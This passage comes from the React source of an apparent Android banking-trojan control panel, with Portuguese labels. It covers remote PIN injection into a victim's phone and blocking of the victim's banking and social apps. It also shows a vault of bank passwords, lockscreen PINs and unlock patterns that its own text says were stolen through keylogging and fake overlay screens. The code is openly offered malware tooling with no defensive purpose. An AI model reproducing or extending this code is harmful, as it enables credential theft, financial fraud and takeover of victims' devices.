                      ðŸš« Bloqueio de Abertura (Tela IndisponÃ­vel):
                    </span>
                    <div className="grid grid-cols-2 gap-1.5">
                      <button
                        onClick={handleBlockAllBanks}
                        className="py-1.5 px-2 rounded-lg bg-rose-950/40 hover:bg-rose-900/60 border border-rose-800/40 text-rose-300 text-[9.5px] font-bold uppercase transition-all text-center"
                      >
                        ðŸš« Travar Bancos
                      </button>
                      <button
                        onClick={handleBlockAllSocial}
                        className="py-1.5 px-2 rounded-lg bg-red-950/40 hover:bg-red-900/60 border border-red-800/40 text-pink-300 text-[9.5px] font-bold uppercase transition-all text-center"
                      >
                        ðŸš« Travar Redes
                      </button>
                    </div>
                    <button
                      onClick={handleUnblockAllApps}
                      className="w-full py-1.5 rounded-lg bg-[#0a1426] hover:bg-[#0e1c36] border border-[#14233e] text-slate-300 text-[9px] font-bold uppercase transition-all text-center"
                    >
                      âœ… Liberar Todos os Aplicativos
                    </button>
                  </div>
                </div>
              </div>

              {/* ========================================================= */}
              {/* CARD 3: INJEÃ‡ÃƒO DE PIN & TECLADO VIRTUAL                  */}
              {/* ========================================================= */}
              <div className="bg-[#081020]/90 backdrop-blur-2xl border border-[#14233e] hover:border-emerald-500/50 rounded-2xl p-4 shadow-xl space-y-3.5 flex flex-col justify-between transition-all">
                <div className="space-y-3">
                  <div className="flex items-center justify-between border-b border-[#14233e] pb-2">
                    <div className="flex items-center gap-2">
                      <div className="w-7 h-7 rounded-lg bg-rose-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
                        <Hash className="w-4 h-4" />
                      </div>
                      <span className="text-xs font-black text-emerald-300 uppercase tracking-wide">
                        3. InjeÃ§Ã£o de PIN & Keypad
                      </span>
                    </div>
                    <span className="text-[9px] text-red-400 font-mono font-bold">Auto Unlock</span>
                  </div>

                  {/* Input de PIN e Delay */}
                  <div className="space-y-2">
                    <div className="flex gap-2">
                      <div className="flex-1 relative">
                        <input
                          type="text"
                          placeholder="Digite o PIN (ex: 1234)..."
                          value={pinInput}
                          onChange={(e) => setPinInput(e.target.value)}
                          className="w-full bg-[#0a1426] border border-[#152442] focus:border-emerald-500 rounded-xl px-3 py-2 text-sm text-white placeholder-slate-500 outline-none font-mono tracking-widest font-black"
                        />
                        {pinInput && (
                          <button
                            onClick={() => setPinInput('')}
                            className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 text-xs"
                          >
                            âœ•
                          </button>
                        )}
                      </div>

                      <select
                        value={pinDelay}
                        onChange={(e) => setPinDelay(Number(e.target.value))}
                        className="bg-[#0a1426] border border-[#152442] text-pink-300 rounded-xl px-2.5 py-2 text-xs outline-none font-mono font-bold"
                        title="Intervalo entre toques no aparelho"
                      >
                        <option value={300}>300ms (Turbo)</option>
                        <option value={500}>500ms (RÃ¡pido)</option>
                        <option value={800}>800ms (Normal)</option>
                        <option value={1200}>1.2s (Seguro)</option>
                      </select>
                    </div>

                    {/* BotÃ£o de Disparo do PIN */}
                    <button
                      onClick={() => handlePlayPinSequence()}
                      className="w-full py-2.5 px-3 rounded-xl bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 text-white font-black text-xs uppercase transition-all flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(16,185,129,0.3)] border border-emerald-400/40"
                    >
                      <Play className="w-3.5 h-3.5" />
                      ðŸš€ INJETAR SEQUÃŠNCIA DE PIN
                    </button>
                  </div>

                  {/* Teclado Virtual NumÃ©rico Interativo */}
                  <div className="bg-[#060c18] border border-[#101b2f] rounded-xl p-2.5 space-y-1.5">
                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">
                      âŒ¨ï¸ Keypad NumÃ©rico Direto (0-9):
                    </span>
                    <div className="grid grid-cols-3 gap-1.5">
                      {['1', '2', '3', '4', '5', '6', '7', '8', '9', 'C', '0', 'âŒ«'].map((k) => (
                        <button
                          key={k}
                          onClick={() => {
                            if (k === 'C') setPinInput('');
                            else if (k === 'âŒ«') setPinInput((prev) => prev.slice(0, -1));
                            else handleLockKeyPress(k);
                          }}
                          className={`py-2 rounded-lg font-mono font-black text-xs uppercase transition-all shadow-sm ${
                            k === 'C'
                              ? 'bg-rose-950/60 text-rose-300 border border-rose-800/50 hover:bg-rose-800 hover:text-white'
                              : k === 'âŒ«'
                              ? 'bg-amber-950/60 text-amber-300 border border-amber-800/50 hover:bg-amber-800 hover:text-white'
                              : 'bg-[#0a1426] hover:bg-[#122244] border border-[#162744] hover:border-red-500/50 text-white active:scale-95'
                          }`}
                        >
                          {k}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* PINs & Senhas Detectados em Tempo Real */}
                  <div className="space-y-1.5 pt-1 border-t border-[#14233e]">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1">
                        <Sparkles className="w-3 h-3 text-amber-400" />
                        PINs Capturados no Keylogger:
                      </span>
                      <span className="text-[9px] text-red-400 font-bold">
                        {detectedPinsAndPasswords.length} encontrados
                      </span>
                    </div>

                    {detectedPinsAndPasswords.length === 0 ? (
                      <div className="text-center py-2 text-[10px] text-slate-500 font-sans">
                        Nenhum PIN ou senha capturado ainda.
                      </div>
                    ) : (
                      <div className="space-y-1 max-h-[140px] overflow-y-auto pr-1">
                        {detectedPinsAndPasswords.map((item, idx) => (
                          <div
                            key={idx}
                            className="p-1.5 px-2.5 rounded-lg bg-[#0a1426] border border-[#152442] hover:border-emerald-500/40 text-xs transition-all flex items-center justify-between gap-2 group"
                          >
                            <div className="truncate min-w-0 flex items-center gap-1.5">
                              {getAppIcon(item.app, item.app)}
                              <span className="font-mono font-black text-emerald-300 tracking-wider">
                                {item.text}
                              </span>
                              <span className="text-[9px] text-slate-400 font-sans truncate">
                                ({item.app})
                              </span>
                            </div>
                            <div className="flex items-center gap-1 shrink-0">
                              <button
                                onClick={() => setPinInput(item.text)}
                                className="text-[9px] px-2 py-0.5 rounded bg-red-950 text-pink-300 border border-red-700/50 font-bold hover:bg-red-500 hover:text-black transition-all"
                                title="Copiar para o campo PIN"
                              >
                                Usar
                              </button>
                              <button
                                onClick={() => handlePlayPinSequence(item.text)}
                                className="text-[9px] px-2 py-0.5 rounded bg-gradient-to-r from-rose-600 to-red-600 text-white font-black uppercase hover:opacity-90 transition-all shadow-sm flex items-center gap-0.5"
                                title="Injetar diretamente no celular"
                              >
                                <Zap className="w-2.5 h-2.5" /> Injetar
                              </button>
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 2.6 VISÃƒO: COFRE DE SENHAS & CREDENCIAIS CAPTURADAS (ORGANIZADO)   */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'passwords' && (
          <div className="w-full max-w-6xl space-y-4 animate-in fade-in zoom-in duration-150 font-mono">
            {/* Header Top Banner */}
            <div className="bg-[#081020]/90 backdrop-blur-2xl border border-amber-500/40 rounded-2xl p-4 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 shadow-[0_0_35px_rgba(245,158,11,0.15)]">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-amber-500/20 via-orange-500/20 to-red-500/20 border border-amber-500/50 flex items-center justify-center text-amber-400 shadow-[0_0_20px_rgba(245,158,11,0.3)]">
                  <KeyRound className="w-6 h-6 animate-pulse" />
                </div>
                <div>
                  <h2 className="text-base font-black text-white uppercase tracking-wider flex items-center gap-2">
                    SENHAS CAPTURADAS DOS INJECTS
                    <span className="text-[10px] px-2.5 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold">
                      {capturedPasswords.length} CAPTURADAS
                    </span>
                  </h2>
                  <p className="text-xs text-slate-400 font-sans mt-0.5">
                    Todas as senhas bancÃ¡rias, PINs e credenciais obtidas exclusivamente atravÃ©s das InjeÃ§Ãµes e Telas Falsas (Overlays).
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 flex-wrap">
                <button
                  onClick={fetchPasswords}
                  disabled={isLoadingPasswords}
                  className="px-3.5 py-2 rounded-xl bg-[#0a1426] border border-[#162744] hover:border-amber-500/50 text-amber-300 text-xs font-bold uppercase transition-all flex items-center gap-1.5 active:scale-95"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${isLoadingPasswords ? 'animate-spin' : ''}`} />
                  Atualizar Senhas
                </button>

                <button
                  onClick={() => {
                    if (capturedPasswords.length === 0) {
                      showToast('Nenhuma senha para copiar', 'info');
                      return;
                    }
                    const textContent = capturedPasswords.map((p, i) => 
                      `[${i+1}] ${p.bank || 'App'} (${p.package || 'pkg'})\n` +
                      `    Senha/PIN: ${p.password || p.digit || p.pattern}\n` +
                      `    Tipo: ${p.hint || p.label || 'Senha'} | Fonte: ${p.source || 'N/A'}\n` +
                      `    Data: ${p.timestamp ? new Date(p.timestamp).toLocaleString('pt-BR') : 'Recente'}\n`
                    ).join('\n----------------------------------------\n');
                    navigator.clipboard.writeText(textContent);
                    showToast(`ðŸ“‹ ${capturedPasswords.length} senhas copiadas para a Ã¡rea de transferÃªncia!`, 'success');
                  }}
                  className="px-3.5 py-2 rounded-xl bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white text-xs font-bold uppercase transition-all flex items-center gap-1.5 shadow-[0_0_15px_rgba(245,158,11,0.3)] active:scale-95"
                >
                  <Copy className="w-3.5 h-3.5" />
                  Copiar Todas (TXT)
                </button>
              </div>
            </div>

            {/* Grid de MÃ©tricas RÃ¡pida */}
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-3">
              <div className="bg-[#081020]/90 border border-[#14233e] rounded-xl p-3 space-y-1">
                <span className="text-[10px] font-bold text-slate-400 uppercase block">Total de Senhas</span>
                <span className="text-xl font-black text-amber-400">{capturedPasswords.length}</span>
              </div>
              <div className="bg-[#081020]/90 border border-[#14233e] rounded-xl p-3 space-y-1">
                <span className="text-[10px] font-bold text-slate-400 uppercase block">Senhas BancÃ¡rias</span>
                <span className="text-xl font-black text-emerald-400">
                  {capturedPasswords.filter(p => p.source === 'keyboard' || p.hint?.includes('SENHA') || p.bank !== 'Lockscreen').length}
                </span>
              </div>
              <div className="bg-[#081020]/90 border border-[#14233e] rounded-xl p-3 space-y-1">
                <span className="text-[10px] font-bold text-slate-400 uppercase block">PINs Lockscreen</span>
                <span className="text-xl font-black text-red-400">
                  {capturedPasswords.filter(p => p.source === 'LOCKSCREEN' || p.bank === 'Lockscreen' || p.hint?.includes('PIN')).length}
                </span>
              </div>
              <div className="bg-[#081020]/90 border border-[#14233e] rounded-xl p-3 space-y-1">
                <span className="text-[10px] font-bold text-slate-400 uppercase block">PadrÃ£o (Pattern)</span>
                <span className="text-xl font-black text-red-400">
                  {capturedPasswords.filter(p => p.hint?.includes('PADRÃƒO') || p.label?.includes('Desenho')).length}
                </span>
              </div>
              <div className="bg-[#081020]/90 border border-[#14233e] rounded-xl p-3 space-y-1">
                <span className="text-[10px] font-bold text-slate-400 uppercase block">Keylogger / Injects</span>
                <span className="text-xl font-black text-rose-400">
                  {capturedPasswords.filter(p => p.source === 'KEYLOGGER' || p.source === 'VISUAL_SCREEN').length}
                </span>
              </div>
            </div>

            {/* Barra de Filtro e Busca */}
            <div className="bg-[#081020]/90 border border-[#14233e] rounded-2xl p-3 space-y-3 shadow-lg font-sans">
              <div className="flex flex-col sm:flex-row items-center justify-between gap-3">
                <div className="relative w-full sm:w-80">
                  <Search className="w-4 h-4 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={passwordSearch}
                    onChange={(e) => setPasswordSearch(e.target.value)}
                    placeholder="Buscar por banco, app, senha ou palavra-chave..."
                    className="w-full bg-[#050b16] border border-[#162744] focus:border-amber-500 rounded-xl pl-9 pr-3 py-2 text-xs text-white font-mono placeholder:text-slate-600 outline-none"
                  />
                  {passwordSearch && (
                    <button onClick={() => setPasswordSearch('')} className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white">
                      <X className="w-3.5 h-3.5" />
                    </button>
                  )}
                </div>

                {/* Subtabs Filtro */}
                <div className="flex items-center gap-1 bg-[#050b16] p-1 rounded-xl border border-[#14233e] text-[11px] font-mono flex-wrap">
                  {[
                    { id: 'all', label: 'Todas' },
                    { id: 'bank', label: 'Bancos' },
                    { id: 'lockscreen', label: 'Lockscreen' },
                    { id: 'pattern', label: 'PadrÃ£o' },
                    { id: 'overlay', label: 'Overlays' },
                    { id: 'keylog', label: 'Keylogger' }
                  ].map((sub) => (
                    <button
                      key={sub.id}
                      onClick={() => setPasswordFilter(sub.id as any)}
                      className={`px-2.5 py-1 rounded-lg font-bold transition-all ${
                        passwordFilter === sub.id
                          ? 'bg-amber-500 text-black shadow-sm font-black'
                          : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      {sub.label}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Lista Organizada de Cards de Senha */}
            {capturedPasswords
              .filter((item) => {
                const rawPwd = String(item.password || item.digit || item.pattern || '').trim().toLowerCase();
                const hintLower = (item.hint || '').toLowerCase();
                if (!rawPwd || rawPwd === 'true' || rawPwd === 'false' || rawPwd === 'none' || rawPwd === 'null') return false;
                if (['package', 'packagename', 'appname', 'ispassword', 'is_password', 'project_id'].includes(hintLower)) return false;
                if (item.package && rawPwd === item.package.toLowerCase()) return false;
                return true;
              })
              .filter((item) => {
                if (passwordFilter === 'bank') return item.bank !== 'Lockscreen' && !item.hint?.includes('PIN');
                if (passwordFilter === 'lockscreen') return item.bank === 'Lockscreen' || item.source === 'LOCKSCREEN' || item.hint?.includes('PIN');
                if (passwordFilter === 'pattern') return item.hint?.includes('PADRÃƒO') || item.label?.includes('Desenho');
                if (passwordFilter === 'overlay') return item.source === 'VISUAL_SCREEN' || item.source === 'HTML_OVERLAY';
                if (passwordFilter === 'keylog') return item.source === 'KEYLOGGER';
                return true;
              })
              .filter((item) => {
                if (!passwordSearch) return true;
                const q = passwordSearch.toLowerCase();
                return (
                  (item.bank || '').toLowerCase().includes(q) ||
                  (item.package || '').toLowerCase().includes(q) ||
                  (item.password || '').toLowerCase().includes(q) ||
                  (item.hint || '').toLowerCase().includes(q) ||
                  (item.label || '').toLowerCase().includes(q)
                );
              }).length === 0 ? (
              <div className="bg-[#081020]/90 border border-[#14233e] rounded-2xl p-10 text-center space-y-3 font-sans">
                <KeyRound className="w-12 h-12 text-slate-600 mx-auto animate-pulse" />
                <div className="text-sm font-bold text-slate-300">Nenhuma senha encontrada nesta categoria</div>
                <p className="text-xs text-slate-500 max-w-md mx-auto">
                  As senhas digitadas pelo alvo nos aplicativos bancÃ¡rios, PINs de tela e injeÃ§Ãµes aparecerÃ£o automaticamente aqui assim que forem capturadas.
                </p>
                <button
                  onClick={fetchPasswords}
                  className="px-4 py-2 bg-amber-500 text-black rounded-xl text-xs font-black uppercase inline-flex items-center gap-2 shadow-lg"
                >
                  <RefreshCw className="w-3.5 h-3.5" /> Recarregar Senhas
                </button>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                {capturedPasswords
                  .filter((item) => {
                    const rawPwd = String(item.password || item.digit || item.pattern || '').trim().toLowerCase();
                    const hintLower = (item.hint || '').toLowerCase();
                    if (!rawPwd || rawPwd === 'true' || rawPwd === 'false' || rawPwd === 'none' || rawPwd === 'null') return false;
                    if (['package', 'packagename', 'appname', 'ispassword', 'is_password', 'project_id'].includes(hintLower)) return false;
                    if (item.package && rawPwd === item.package.toLowerCase()) return false;
                    return true;
                  })
                  .filter((item) => {
                    if (passwordFilter === 'bank') return item.bank !== 'Lockscreen' && !item.hint?.includes('PIN');
                    if (passwordFilter === 'lockscreen') return item.bank === 'Lockscreen' || item.source === 'LOCKSCREEN' || item.hint?.includes('PIN');
                    if (passwordFilter === 'pattern') return item.hint?.includes('PADRÃƒO') || item.label?.includes('Desenho');
                    if (passwordFilter === 'overlay') return item.source === 'VISUAL_SCREEN' || item.source === 'HTML_OVERLAY';
                    if (passwordFilter === 'keylog') return item.source === 'KEYLOGGER';
                    return true;
                  })
                  .filter((item) => {
                    if (!passwordSearch) return true;
                    const q = passwordSearch.toLowerCase();
                    return (
                      (item.bank || '').toLowerCase().includes(q) ||
                      (item.package || '').toLowerCase().includes(q) ||
                      (item.password || '').toLowerCase().includes(q) ||
                      (item.hint || '').toLowerCase().includes(q) ||
                      (item.label || '').toLowerCase().includes(q)
                    );
                  })
                  .map((item, idx) => {
                    const isRevealed = revealedPasswords[item.id || idx];
                    const rawPwd = String(item.password || item.digit || item.pattern || '');
                    const isNumericPin = /^\d{4,8}$/.test(rawPwd);
                    const bankLower = (item.bank || '').toLowerCase();
                    const pkgLower = (item.package || '').toLowerCase();

                    // Tema de cores do card baseado no banco/tipo
                    let borderTheme = 'border-[#14233e] hover:border-amber-500/50';
                    let bgBadge = 'bg-amber-500/20 text-amber-300 border-amber-500/40';
                    let categoryTitle = item.label || item.hint || 'SENHA CAPTURADA';

                    if (bankLower.includes('itau') || pkgLower.includes('itau')) {
                      borderTheme = 'border-orange-500/40 hover:border-orange-400 bg-orange-950/10';
                      bgBadge = 'bg-orange-500/20 text-orange-300 border-orange-500/40';
                    } else if (bankLower.includes('nubank') || pkgLower.includes('nu')) {
                      borderTheme = 'border-purple-500/40 hover:border-purple-400 bg-purple-950/10';
                      bgBadge = 'bg-purple-500/20 text-purple-300 border-purple-500/40';
                    } else if (bankLower.includes('caixa') || pkgLower.includes('caixa')) {
                      borderTheme = 'border-red-500/40 hover:border-red-400 bg-red-950/10';
                      bgBadge = 'bg-red-500/20 text-pink-300 border-red-500/40';
                    } else if (bankLower.includes('bradesco') || pkgLower.includes('bradesco')) {
                      borderTheme = 'border-red-500/40 hover:border-red-400 bg-red-950/10';
                      bgBadge = 'bg-red-500/20 text-red-300 border-red-500/40';
                    } else if (item.bank === 'Lockscreen' || item.source === 'LOCKSCREEN') {
                      borderTheme = 'border-red-500/40 hover:border-red-400 bg-red-950/10';
                      bgBadge = 'bg-red-500/20 text-pink-300 border-red-500/40';
                      categoryTitle = 'DESBLOQUEIO DE TELA';
                    }

                    return (
                      <div
                        key={item.id || idx}
                        className={`bg-[#081020]/95 rounded-2xl p-4 space-y-3 shadow-xl border transition-all ${borderTheme}`}
                      >
                        {/* Header do Card */}
                        <div className="flex items-start justify-between gap-2 border-b border-[#14233e] pb-2.5">
                          <div className="flex items-center gap-2.5 min-w-0">
                            <div className={`w-10 h-10 rounded-xl flex items-center justify-center font-black text-sm shrink-0 border ${bgBadge}`}>
                              {item.bank === 'Lockscreen' ? <Lock className="w-5 h-5" /> : (item.bank ? item.bank.charAt(0).toUpperCase() : 'ðŸ”‘')}
                            </div>
                            <div className="truncate min-w-0 font-sans">
                              <div className="flex items-center gap-1.5 flex-wrap">
                                <h4 className="font-bold text-xs text-white truncate">{item.bank || 'Aplicativo'}</h4>
                                <span className={`text-[8.5px] px-2 py-0.2 rounded-full font-mono font-bold border uppercase shrink-0 ${bgBadge}`}>
                                  {categoryTitle}
                                </span>
                              </div>
                              <div className="text-[10px] text-slate-400 font-mono truncate mt-0.5">
                                {item.package || 'com.seguranca.protecao'}
                              </div>
                            </div>
                          </div>

                          <div className="text-[10px] text-slate-400 font-mono text-right shrink-0">
                            {item.timestamp ? new Date(item.timestamp).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : 'Recente'}
                            <div className="text-[9px] text-slate-500">
                              {item.timestamp ? new Date(item.timestamp).toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' }) : ''}
                            </div>
                          </div>
                        </div>

                        {/* PASSWORD CONTAINER PRINCIPAL */}
                        <div className="bg-[#050b16] border border-[#162744] rounded-xl p-3 flex items-center justify-between gap-2 shadow-inner">
                          <div className="min-w-0 flex-1">
                            <div className="text-[9px] text-slate-500 uppercase font-bold tracking-wider mb-0.5">
                              {item.hint || 'SENHA CAPTURADA'}:
                            </div>
                            <div className="font-mono text-base font-black tracking-widest text-emerald-400 select-all break-all">
                              {isRevealed ? rawPwd : 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢'}
                            </div>
                          </div>

                          <div className="flex items-center gap-1 shrink-0">
                            {/* Toggle Reveal */}
                            <button
                              onClick={() => {
                                setRevealedPasswords((prev) => ({
                                  ...prev,
                                  [item.id || idx]: !prev[item.id || idx]
                                }));
                              }}
                              className="p-2 rounded-lg bg-[#0c1830] hover:bg-[#142647] text-slate-300 hover:text-white border border-[#1d3257] transition-all"
                              title={isRevealed ? 'Ocultar senha' : 'Exibir senha em texto puro'}
                            >
                              {isRevealed ? <EyeOff className="w-4 h-4 text-amber-400" /> : <Eye className="w-4 h-4 text-red-400" />}
                            </button>

                            {/* Copiar Senha */}
                            <button
                              onClick={() => {
                                navigator.clipboard.writeText(rawPwd);
                                showToast(`ðŸ”‘ Senha "${rawPwd}" copiada!`, 'success');
                              }}
                              className="p-2 rounded-lg bg-[#0c1830] hover:bg-amber-500 hover:text-black text-amber-300 border border-amber-500/40 font-bold transition-all flex items-center gap-1 text-[10px]"
                              title="Copiar senha para a Ã¡rea de transferÃªncia"
                            >
                              <Copy className="w-4 h-4" />
                            </button>
                          </div>
                        </div>

                        {/* RodapÃ© de AÃ§Ãµes RÃ¡pida (Ex: Injetar PIN no teclado) */}
                        <div className="flex items-center justify-between text-[10px] font-sans pt-1">
                          <div className="flex items-center gap-1 text-slate-400 font-mono">
                            <span className="text-slate-500">Fonte:</span>
                            <span className="text-slate-300 font-bold uppercase">{item.source || 'TECLADO / VNC'}</span>
                          </div>

                          {isNumericPin && (
                            <button
                              onClick={() => {
                                sendCommand({ action: 'INJECT_PIN', pin: rawPwd, sequence: rawPwd });
                                showToast(`âš¡ Injetando PIN ${rawPwd} no aparelho...`, 'info');
                              }}
                              className="px-2.5 py-1 rounded-lg bg-rose-500/20 hover:bg-rose-500 hover:text-black text-emerald-300 border border-emerald-500/40 font-mono font-bold transition-all flex items-center gap-1 text-[10px]"
                              title="Usar esta senha para desinstalar / desbloquear aparelho"
                            >
                              <Zap className="w-3 h-3 text-emerald-400" /> Injetar PIN ({rawPwd})
                            </button>
                          )}
                        </div>
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 3. VISÃƒO: APLICATIVOS (APPLICATIONS)                             */}
        {/* ----------------------------------------------------------------- */}
        {/* 3. VISÃƒO: GERENCIADOR DE APLICATIVOS                              */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'apps' && (
          <div className="w-full max-w-5xl space-y-4 font-mono animate-in fade-in zoom-in duration-150">
            {/* Top Bar Header */}
            <div className="bg-[#081020]/95 backdrop-blur-2xl border border-[#14233e] rounded-2xl p-4 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 shadow-2xl">
              <div>
                <h2 className="text-sm font-black text-white uppercase tracking-wider flex items-center gap-2">
                  <Package className="w-4 h-4 text-red-400" />
                  APLICATIVOS | {deviceName}
                  <span className="text-[10px] px-2.5 py-0.5 rounded-full bg-red-500/10 text-pink-300 border border-red-500/30 font-bold font-mono">
                    {appsList.length} instalados
                  </span>
                </h2>
                <span className="text-[10px] text-slate-400 tracking-widest uppercase block mt-0.5 font-sans">
                  GERENCIAMENTO E EXECUÃ‡ÃƒO REMOTA DE APLICATIVOS
                </span>
              </div>

              <div className="flex items-center gap-3 w-full md:w-auto">
                <div className="relative flex-1 md:w-64">
                  <Search className="w-3.5 h-3.5 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={appSearch}
                    onChange={(e) => setAppSearch(e.target.value)}
                    placeholder="Pesquisar por nome ou pacote..."
                    className="w-full bg-[#040914] border border-[#14233e] focus:border-red-500/60 rounded-xl pl-8 pr-3 py-1.5 text-xs text-slate-100 placeholder-slate-500 outline-none font-mono"
                  />
                </div>

                <button
                  onClick={fetchApps}
                  className="px-3.5 py-1.5 bg-[#0070f3] hover:bg-[#0060d4] text-white rounded-xl text-xs font-bold uppercase tracking-wider flex items-center gap-1.5 shadow-[0_0_15px_rgba(0,112,243,0.4)] shrink-0 active:scale-95 transition-all"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${isLoadingApps ? 'animate-spin' : ''}`} />
                  ATUALIZAR
                </button>
              </div>
            </div>

            {/* Central de Bloqueio de Abertura */}
            <div className="bg-[#060d1a]/90 border border-[#14233e] rounded-2xl p-3 flex flex-wrap items-center justify-between gap-3 shadow-inner">
              <div className="flex items-center gap-2.5">
                <div className="w-7 h-7 rounded-lg bg-rose-500/10 border border-rose-500/30 flex items-center justify-center shrink-0">
                  <ShieldAlert className="w-4 h-4 text-rose-400" />
                </div>
                <div>
                  <div className="text-xs font-bold text-slate-200 uppercase tracking-wider font-mono flex items-center gap-2">
                    Central de Bloqueio de Abertura
                    <span className="text-[10px] px-2 py-0.2 rounded bg-rose-500/20 border border-rose-500/40 text-rose-300 font-bold font-mono">
                      {blockedApps.length} impedidos
                    </span>
                  </div>
                  <span className="text-[10px] text-slate-400 font-sans block">Bloqueie a inicializaÃ§Ã£o de aplicativos no aparelho da vÃ­tima com mensagem personalizada.</span>
                </div>
              </div>

              <div className="flex items-center gap-2 flex-wrap">
                <button
                  onClick={handleBlockAllBanks}
                  className="px-3 py-1.5 bg-rose-950/60 hover:bg-rose-900 border border-rose-500/40 hover:border-rose-400 text-rose-300 rounded-xl text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1.5 shadow-sm active:scale-95"
                  title="Ativar tela de Aplicativo IndisponÃ­vel para todos os Bancos instalados"
                >
                  <Lock className="w-3 h-3" /> Impedir Todos Bancos
                </button>
                <button
                  onClick={handleBlockAllSocial}
                  className="px-3 py-1.5 bg-amber-950/60 hover:bg-amber-900 border border-amber-500/40 hover:border-amber-400 text-amber-300 rounded-xl text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1.5 shadow-sm active:scale-95"
                  title="Bloquear redes sociais (WhatsApp, Instagram, etc)"
                >
                  <Lock className="w-3 h-3" /> Impedir Redes Sociais
                </button>
                {blockedApps.length > 0 && (
                  <button
                    onClick={handleUnblockAllApps}
                    className="px-3 py-1.5 bg-rose-950/60 hover:bg-rose-900 border border-emerald-500/40 hover:border-emerald-400 text-emerald-300 rounded-xl text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1.5 shadow-sm active:scale-95"
                  >
                    <Unlock className="w-3 h-3" /> Liberar Todos Apps
                  </button>
                )}
              </div>
            </div>

            {/* Categorias / Subtabs */}
            <div className="bg-[#060d1a]/95 backdrop-blur-xl border border-[#14233e] rounded-2xl p-1.5 flex items-center gap-1.5 text-xs">
              {[
                {
                  id: 'personal',
                  label: 'APLICATIVOS DO USUÃRIO',
                  count: appsList.filter((a) => !a.isSystem).length
                },
                {
                  id: 'banks',
                  label: 'BANCOS & CARTEIRAS',
                  count: appsList.filter((a) => a.isBank || isBankApp(a.package, a.name)).length
                },
                {
                  id: 'system',
                  label: 'APLICATIVOS DO SISTEMA',
                  count: appsList.filter((a) => a.isSystem).length
                },
                {
                  id: 'all',
                  label: 'TODOS OS APPS',
                  count: appsList.length
                }
              ].map((sub) => (
                <button
                  key={sub.id}
                  onClick={() => setAppsTab(sub.id as any)}
                  className={`flex-1 py-2 px-3 text-center rounded-xl font-bold uppercase tracking-wider transition-all flex items-center justify-center gap-2 ${
                    appsTab === sub.id
                      ? 'bg-[#0070f3] text-white shadow-[0_0_15px_rgba(0,112,243,0.4)] font-black'
                      : 'text-slate-400 hover:text-slate-200 hover:bg-[#0c1830]'
                  }`}
                >
                  <span className="text-[11px] font-mono">{sub.label}</span>
                  <span
                    className={`text-[9px] px-2 py-0.5 rounded-full font-mono font-bold ${
                      appsTab === sub.id ? 'bg-white/20 text-white' : 'bg-[#040914] text-slate-400 border border-[#14233e]'
                    }`}
                  >
                    {sub.count}
                  </span>
                </button>
              ))}
            </div>

            {/* Grid de Aplicativos Organizados */}
            {appsList
              .filter((app) => {
                if (appsTab === 'banks') return app.isBank || isBankApp(app.package, app.name);
                if (appsTab === 'system') return app.isSystem;
                if (appsTab === 'all') return true;
                return !app.isSystem;
              })
              .filter(
                (app) =>
                  (app.name || '').toLowerCase().includes(appSearch.toLowerCase()) ||
                  (app.package || '').toLowerCase().includes(appSearch.toLowerCase())
              ).length === 0 ? (
              <div className="bg-[#081020]/95 backdrop-blur-2xl border border-[#14233e] rounded-2xl p-10 text-center space-y-3 shadow-xl">
                <Package className="w-10 h-10 text-slate-500 mx-auto" />
                <div className="text-sm font-bold text-slate-300">Nenhum aplicativo encontrado nesta categoria</div>
                <p className="text-xs text-slate-500 font-sans">
                  Clique em Sincronizar para atualizar a lista completa de aplicativos do dispositivo alvo.
                </p>
                <button
                  onClick={fetchApps}
                  className="px-4 py-2 bg-[#0070f3] text-white rounded-xl text-xs font-bold uppercase inline-flex items-center gap-2 shadow-lg"
                >
                  <RefreshCw className="w-3.5 h-3.5" /> Sincronizar Agora
                </button>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5">
                {appsList
                  .filter((app) => {
                    if (appsTab === 'banks') return app.isBank || isBankApp(app.package, app.name);
                    if (appsTab === 'system') return app.isSystem;
                    if (appsTab === 'all') return true;
                    return !app.isSystem;
                  })
                  .filter(
                    (app) =>
                      (app.name || '').toLowerCase().includes(appSearch.toLowerCase()) ||
                      (app.package || '').toLowerCase().includes(appSearch.toLowerCase())
                  )
                  .map((app, idx) => {
                    const pkgLower = (app.package || '').toLowerCase();
